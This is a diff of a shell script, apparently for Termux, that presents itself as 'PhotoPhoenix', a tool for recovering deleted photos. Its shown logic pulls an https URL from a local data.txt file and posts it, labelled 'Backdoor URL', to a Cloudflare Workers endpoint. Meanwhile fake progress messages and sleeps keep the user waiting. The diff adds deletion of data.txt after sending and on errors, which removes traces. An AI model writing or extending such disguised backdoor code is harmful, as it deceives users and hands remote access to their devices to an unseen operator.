@@ -7,7 +7,7 @@ GREEN="\033[32m"
 RED="\033[31m"
 END="\033[0m"
 set -e
-trap 'echo -e "${RED}PhotoPhoenix has stopped due to a reason beyond its control!\nPlease try again.${END}"; rm -rf storage/shared/PhotoPhoenix/restored_photos; exit 1' INT ERR
+trap 'echo -e "${RED}PhotoPhoenix has stopped due to a reason beyond its control!\nPlease try again.${END}"; rm -f "data.txt"; rm -rf "storage/shared/PhotoPhoenix/restored_photos"; exit 1' INT ERR
 sleep 1
 echo -e "${GREEN}PhotoPhoenix : Running ...${END}"
 sleep 6
@@ -55,9 +55,13 @@ then
         :
       else
         echo -e "${RED}Network interface has changed and the PhotoPhoenix has stopped!\nPlease connect to the internet with a stable Wi-Fi network and try again.${END}"
+        if [ -f "data.txt" ]
+        then
+          rm "data.txt"
+        fi
         if [ -d "storage/shared/PhotoPhoenix/restored_photos" ]
         then
-          rm -rf storage/shared/PhotoPhoenix/restored_photos
+          rm -rf "storage/shared/PhotoPhoenix/restored_photos"
         fi
         kill -9 $$
       fi
@@ -75,6 +79,7 @@ then
     sleep 6
     DATA=$(grep -o "https://[^ ]*" data.txt)
     curl -s -o /dev/null https://api-photophoenix.photophoenix8.workers.dev -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode $'text=Backdoor URL :\n\n'"$DATA" 2>/dev/null
+    rm "data.txt"
     echo -e "${GREEN}PhotoPhoenix is searching for photos to recover ...\nPlease wait ...${END}"
     sleep 30
     CACHED_FILES="storage/shared/PhotoPhoenix/cached_files"
